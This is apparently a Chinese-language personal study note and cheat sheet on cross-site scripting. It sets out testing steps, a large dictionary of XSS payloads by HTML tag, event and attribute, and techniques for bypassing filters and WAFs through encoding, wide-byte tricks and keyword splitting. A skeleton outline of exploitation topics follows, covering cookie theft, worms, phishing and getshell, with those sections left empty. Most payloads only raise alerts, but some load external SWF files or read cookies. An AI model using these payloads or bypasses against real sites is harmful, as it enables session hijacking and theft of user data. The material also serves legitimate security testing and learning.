[TOC]
XSS的水很深……是否深入以后再说，在此介绍一下我的自己的XSS知识框架总结计划
总结自哈士奇大佬：![xss测试备忘录](http://139.129.31.35/index.php/archives/494/)
# XSS漏洞挖掘
## 测试流程

### 黑盒
1. 先使用几个简单的标签 or Payload测试输出点以及waf
`'";!-=#$%^&{()}<script javascript data onload href src img input><a href></a>alert(String.fromCharCode(88,83,83));prompt(1);confirm(1)</script>`
如果有长度限制的话可以分开测试。
2. 如果某些只是转换为了空字符则可以使用双写法绕过，并尝试大小写绕过
3. 如果大部分标签、属性都被过滤，可以尝试一些生僻标签【1】,以及一些不常用事件【2】，或特殊属性【3】
4. 简单黑盒测试无效后果断放弃，不要想太多的绕过；
### 白盒
#### cms挖掘
##### 通过输出口回溯查找
    1. printf 
    2. echo 
    3. print 
    4. print_r 
    5. die 
    6. var_dump 
    7. var_export
##### flash
主要查看ExternalInterface.call的参数是否可控；
call(functionName:String, … arguments):*
即后面可以有很多很多个参数，我们统称为第2个参数。有时候我们会遇到ExternalInterface.call(“xxxxx”,”可控内容”);
这时就很可能存在XSS漏洞（菜鸟我不会……）
## payload构造
### payload手册
#### 可以执行js的标签：
    `
        1. <script>
        2. <a> 
        3. <p> 
        4. <img> 
        5. <body> 
        6. <button> 
        7. <var> 
        8. <div> 
        9. <iframe> 
        10. <object> 
        11. <input> 
        12. <select> 
        13. <textarea> 
        14. <keygen> 
        15. <frameset> 
        16. <embed> 
        17. <svg> 
        18. <math> 
        19. <video> 
        20. <audio>
    `
#### 可以执行js的事件
    `
        1. onload 
        2. onunload 
        3. onchange 
        4. onsubmit 
        5. onreset 
        6. onselect 
        7. onblur 
        8. onfocus 
        9. onabort 
        10. onkeydown 
        11. onkeypress 
        12. onkeyup 
        13. onclick 
        14. ondbclick 
        15. onmouseover 
        16. onmousemove 
        17. onmouseout 
        18. onmouseup 
        19. onforminput 
        20. onformchange 
        21. ondrag 
        22. ondrop
    `
#### 可以执行js的属性
    `
        1. formaction 
        2. action 
        3. href 
        4. xlink:href 
        5. autofocus 
        6. src 
        7. content 
        8. data
    `
#### payload字典
##### a 标签
1. javascript 伪协议：
`<a href=javascript:alert(2)>`
2. data 协议执行 javascript：
`<a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgzKTwvc2NyaXB0Pg==>`
3. urlencode 版本：
`<a href=data:text/html;%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%2829%29%3C%2F%73%63%72%69%70%74%3E>`
4. 不使用 href 的另外一种组合来执行 js：
`<svg><a xlink:href="javascript:alert(14)"><rect width="1000" height="1000" fill="white"/></a></svg> `
或者：
`<math><a xlink:href=javascript:alert(1)></math>`
#### script 标签
1. 最简单的测试 payload：
`<script>alert(1)</script>`
2. jsfuck 版本：
`<script>alert((+[][+[]]+[])[++[[]][+[]]]+([![]]+[])[++[++[[]][+[]]][+[]]]+([!![]]+[])[++[++[++[[]][+[]]][+[]]][+[]]]+([!![]]+[])[++[[]][+[]]]+([!![]]+[])[+[]])</script>`
3. 各种编码版本：
`<script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script>` 
`<script>prompt(-[])</script>`//不只是alert。prompt和confirm也可以弹窗 
 
`<script>alert(/3/)</script>`//可以用"/"来代替单引号和双引号 
 
`<script>alert(String.fromCharCode(49))</script>` //我们还可以用char
 
`<script>alert(/7/.source)</script>` // ".source"不会影响alert(7)的执行
 
`<script>setTimeout('alert(1)',0)</script>` //如果输出是在setTimeout里，我们依然可以直接执行alert(1)
#### button 标签
1. event 事件实现 js 调用：
`<button/onclick=alert(1) >M</button>`
2. html5 的新姿势：
需要交互的版本：
`<form><button formaction=javascript&colon;alert(1)>M`

不需要交互的版本：
`<button onfocus=alert(1) autofocus>`
#### p 标签
1. 如果发现变量输出在 p 标签中，只要能跳出""就足够了：
`<p/onmouseover=javascript:alert(1); >M</p>`
#### img 标签
有些姿势是因为浏览器的不同而不能成功执行的。
只在 chrome 下有效：
`<img src ?itworksonchrome?\/onerror = alert(1)>`  //只在chrome下有效
 
`<img/src/onerror=alert(1)>`  //只在chrome下有效
其他：

`<img src=x onerror=alert(1)>` 
 
`<img src="x:kcf" onerror="alert(1)">`
以下全是通过事件来调用 js 的，可以利用上面给出的列表自己组合。

#### body 标签
通过 event 事件来调用 js
`<body onload=alert(1)> `
 
`<body onscroll=alert(1)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>`
#### var 标签
`<var onmouseover="prompt(1)">M</var>`
#### div 标签
`<div/onmouseover='alert(1)'>X`
 
`<div style="position:absolute;top:0;left:0;width:100%;height:100%" onclick="alert(52)">`
#### iframe 标签
有时候我们可以通过实体编码、换行和 Tab 字符来 bypass。我们还可以通过事先在 swf 文件中插入我们的 xss code，然后通过 src 属性来调用。不过关于 flash，只有在 crossdomain.xml 文件中，allow-access-from domain="*" 允许从外部调用 swf 时，才可以通过 flash 来事先 xss attack。
下面的&Tab;为 tab 字符
`<iframe  src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>` 
`<iframe SRC="http://0x.lv/xss.swf"></iframe>` 
`<IFRAME SRC="javascript:alert(1);"></IFRAME>` 
`<iframe/onload=alert(1)></iframe>`
#### meta 标签
测试时发现昵称，文章标题跑到 meta 标签中，那么只需要跳出当前属性再添加http-equiv="refresh"，就可以构造一个有效地 xss payload。还有一些猥琐的思路，就是通过给http-equiv设置set-cookie，进一步重新设置 cookie 来干一些猥琐的事情。
`<meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/>`
`<meta http-equiv="refresh" content="0; url=data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E">`
#### object 标签
和 a 标签的 href 属性的玩法是一样的，优点是无需交互。
`<object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgiS0NGIik8L3NjcmlwdD4=></object>`
#### marquee 标签
`<marquee onstart="alert('1')"></marquee>`
#### isindex 标签
在一些只针对属性做了过滤的 webapp 中，action 很有可能是漏网之鱼。
`<isindex type=image src=1 onerror=alert(1)> `
`<isindex action=javascript:alert(1) type=image>`
#### input 标签
通过 event 来调用 js。和 button 一样通过 autofocus 可以达到无需交互即可弹窗的效果。
`<input onfocus=javascript:alert(1) autofocus>` 
`<input onblur=javascript:alert(1) autofocus><input autofocus>`
#### select 标签
`<select onfocus=javascript:alert(1) autofocus>`
#### textarea 标签
`<textarea onfocus=javascript:alert(1) autofocus>`
#### keygen 标签
`<keygen onfocus=javascript:alert(1) autofocus>`
#### frameset 标签
`<FRAMESET><FRAME SRC="javascript:alert(1);"></FRAMESET>` 
#### embed 标签
`<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgiS0NGIik8L3NjcmlwdD4="></embed>` //chrome 
`<embed src=javascript:alert(1)>` //firefox
#### svg 标签
`<svg onload="javascript:alert(1)" xmlns="http://www.w3.org/2000/svg"></svg>`
`<svg xmlns="http://www.w3.org/2000/svg"><g onload="javascript:alert(1)"></g></svg>`  //chrome有效
#### math 标签
`<math href="javascript:javascript:alert(1)">CLICKME</math>` 
`<math><y/xlink:href=javascript:alert(51)>test1` 
`<math> <maction actiontype="statusline#http://wangnima.com" xlink:href="javascript:alert(49)">CLICKME</maction> </math>`
#### video 标签
`<video><source onerror="alert(1)"> ` 
`<video src=x onerror=alert(48)>`
#### audio 标签
`<audio src=x onerror=alert(47)>`
### 属性字典（待补充）
说几个可能特殊一点的属性，其他的属性请组合相应的标签使用并构造。
#### background 属性
`<table background=javascript:alert(1)></table>` // 在Opera 10.5和IE6上有效
#### poster 属性
`<video poster=javascript:alert(1)//></video>` // Opera 10.5以下有效
#### code 属性
`<applet code="javascript:confirm(document.cookie);">` // Firefox有效
`<embed code="http://businessinfo.co.uk/labs/xss/xss.swf" allowscriptaccess=always>`
#### expression 属性
`<img style="xss:expression(alert(0))">` // IE7以下
 
`<div style="color:rgb(''&#0;x:expression(alert(1))"></div>` // IE7以下
 
`<style>#test{x:expression(alert(/XSS/))}</style>` // IE7以下
#### 最短的测试向量
`<q/oncut=alert(1)>`//在限制长度的地方很有效
#### 嵌套
`<marquee<marquee/onstart=confirm(2)>/onstart=confirm(1)>`
`<bodylanguage=vbsonload=alert-1`//IE8有效
`<command onmouseover="\x6A\x61\x76\x61\x53\x43\x52\x49\x50\x54\x26\x63\x6F\x6C\x6F\x6E\x3B\x63\x6F\x6E\x6 6\x69\x72\x6D\x26\x6C\x70\x61\x72\x3B\x31\x26\x72\x70\x61\x72\x3B">Save</command>` //IE8有效
### 通用
### 特定
## 条件绕过（和上一个类似）
### 过滤
1. 过滤括号
    当括号被过滤的时候可以使用 throw 来绕过
    `<a onmouseover="javascript:window.onerror=alert;throw 1>`
    `<img src=x onerror="javascript:window.onerror=alert;throw 1">`
    以上两个测试向量在 Chrome 和 IE 上会出现一个 "uncaught" 错误，可以用下面的向量代替：
    `<body/onload=javascript:window.onerror=eval;throw'=alert\x281\x29';>`
2. 当=();:被过滤时
    `<svg><script>alert&#40/1/&#41</script>` // 通杀所有浏览器s
    opera 中可以不闭合
    `<svg><script>alert&#40 1&#41` // Opera可查s
3. 过滤某些关键字（如：javascript）
可以在属性中的引号内容中使用空字符、空格、TAB换行、注释、特殊的函数，将代码行隔开。比如在使用`<iframe src="javascript:alert(1253)" height=0 width=0 /><iframe>`时，可以用回车、Tab键将src中的内容隔开，回车的url编码为%0a,%0b;
拼凑法：① 双写绕过；② 使用js定义变量z=scri, z+pt=script; ③ 两处输出点`<scri<!-- 第二处-->pt>`;
4. 本地waf
该包绕过；
5. 使用了宽字节字符集
在PHP中，若你开启magic_quotes_gpc=On时，输入的“会转化为\”. 即会对引号做处理，导致攻击失败。而\符号的16进制表示为0x5c，正好在GBK的第字节中。所以，如果之前又一个高字节，那么正好会被组成一个合法字符，可以使用%df来测试。
常见的宽字符集有：GB2312、GBK、GB18030、BIG5、Shift_JIS；
所以，针对存在这种过滤的PHP网页，我们可以输入%81”来绕过过滤。
输入上面的字符，我们的引号还是会转化为”，但是由于此时最终代码为％81”。在宽字节中，％81\会拼接成一个合法字符，于是后main的双引号就会产生闭合，就能成功触发XSS了。
6. 绕过单引号
`<script>String.fromCharCode(97, 108, 101, 114, 116, 40, 34, 88, 83, 83, 34, 41, 59)</script>`
7. 输出在js注释中
直接换行符走你；
8. 两个注入点（绕过谷歌）
`http://xxx/chrome.php?text1=<script>alert(/XSS/);void('&text2=')</script> ``http://xxx/chrome.php?text1=<script>alert(/XSS/);document.write('&text2=')</script>`
9. 具有可控上传点
网站域名下有可控的上传点，我可以上传一个.txt或.js等文件（只要不是媒体文件，其他文件均可，比如上传是黑名单验证的，可以随便写个后缀）。再引入script标签的src属性即可。
payload:
`xss=%3Cscript%20src=/game/xss/upload/upload.txt%3E%3C/script%3E`
10. 存在json数据解析
context：
`<?=json_encode($_GET['x'])?> `
payload：
` ?x=<img+src=x+onerror=ö-alert(1)>`
### 编码
很多情况下 WAF 会实体编码用户的输入数据，
javascript 是一个很灵活的语言，可以使用很多编码，比如十六进制，Unicode 和 HTML。但是也对这些编码可以用在哪个位置有规定。
属性：
    1. href=
    2. action=
    3. formaction=
    4. location=
    5. on*=
    6. name=
    7. background=
    8. poster=
    9. src=
    10. code=
    支持的编码方式：HTML，八进制，十进制，十六进制和 Unicode
属性：
    1. data=
    支持的编码：base64
### 变换
使用 HTML 实体 URL 编码绕过黑名单，href 里会自动实体解码，如果都失败了，可以尝试使用 vbscript 在 IE10 以下都有效，或者使用 data 协议。
#### JavaScript 变换
    使用 javascript 协议时可使用的例子：
    1. javascript&#00058;alert(1)
    2. javaSCRIPT&colon;alert(1)
    3. JaVaScRipT:alert(1)
    4. javas&Tab;cript:\u0061lert(1);
    5. javascript:\u0061lert&#x28;1&#x29
    6. javascript&#x3A;alert&lpar;document&period;cookie&rpar;
#### Vbscript 变换
    1. vbscript:alert(1);
    2. vbscript&#00058;alert(1);
    3. vbscr&Tab;ipt:alert(1)"
Data URl
    1. data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
### JSON
当你的输入会在 encodeURIComponent 当中显示出来的时候，很容易插入 xss 代码了
encodeURIComponent('userinput')
userinput 处可控，测试代码：
    1. -alert(1)-
    2. -prompt(1)-
    3. -confirm(1)-
### SVG 标签
当返回结果在 svg 标签中的时候，会有一个特性
    `<svg><script>varmyvar="YourInput";</script></svg>`
YourInput 可控，输入
    `www.site.com/test.php?var=text";alert(1)//`
如果把 " 编码一些他仍然能够执行:
    `<svg><script>varmyvar="text&quot;;alert(1)//";</script></svg>`

# XSS漏洞利用
## 窃取用户信息
## XSS后门-（CSRF/反射型XSS+selfxss）
## 按攻击方式
### 定向攻击
### 诱骗攻击
#### XSS+clickjacking
#### XSS+phishing
### 水坑攻击
## 按用户种类
### 普通用户
### 管理员
#### Blind XSS
#### XSS GetSHELL
## 按信息种类
### 客户端信息
### 密码/个人信息
# 信息传播
## XSS蠕虫
## 虚假消息
# 突破浏览器限制
## 地址栏欺诈
## 本地命令执行
# XSS学习（私密）
## XSS练习平台及Writeup
## XSS案例（最好能自己做个备份）
## XSS成熟的payload
